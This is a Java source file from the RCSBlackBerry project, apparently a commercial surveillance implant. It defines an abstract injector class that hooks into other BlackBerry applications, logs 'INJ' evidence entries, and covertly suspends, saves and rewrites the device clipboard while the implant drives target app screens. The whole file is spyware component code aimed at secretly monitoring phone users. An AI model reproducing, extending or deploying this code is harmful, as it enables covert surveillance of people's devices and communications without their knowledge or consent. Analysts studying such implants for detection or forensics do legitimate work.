//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2012
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.injection.injectors;

import net.rim.device.api.system.Clipboard;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.UiApplication;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.module.ModuleClipboard;

public abstract class AInjector {
    //#ifdef DEBUG
    private static Debug debug = new Debug("AInjector", DebugLevel.VERBOSE);
    //#endif
    private UiApplication injectedApp = null;
    private int tries = 0;
    protected boolean enabled = true;
    private Object clip;

    public abstract String getAppName();

    public abstract String getCodName();

    public abstract String[] getWantedScreen();

    public abstract void playOnScreen(Screen screen);

    public boolean enabled() {
        return enabled;
    }

    public final void disable() {
        enabled = false;
    }

    public void incrTries() {
        tries++;
    }

    public int getTries() {
        return tries;
    }

    public void resetTries() {
        tries = 0;
    }

    public void setInjectedApp(UiApplication app) {
        //#ifdef DEBUG
        debug.trace("setInjectedApp: INJECTED");
        //#endif
        this.injectedApp = app;
        Evidence.info("INJ: " + getAppName());
    }

    public UiApplication getInjectedApp() {
        return injectedApp;
    }

    public boolean isInjected() {
        return injectedApp != null;
    }

    protected void disableClipboard() {
        //#ifdef DEBUG
        debug.trace("disableClipboard");
        //#endif
        clip = Clipboard.getClipboard().get();
        ModuleClipboard.getInstance().suspendClip();
    }

    protected void enableClipboard() {
        //#ifdef DEBUG
        debug.trace("enableClipboard");
        //#endif
        ModuleClipboard.getInstance().resumeClip();

        try {
            Clipboard.getClipboard().put(clip);
        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error(ex);
            debug.error("setClip: " + clip); //$NON-NLS-1$
            //#endif
        }
    }

    protected void setClipboard(Object object) {
        if (object instanceof String) {
            String clip = (String) object;
            ModuleClipboard.getInstance().setClip(clip);
        }
    }

    public abstract String getPreferredMenuName();
}
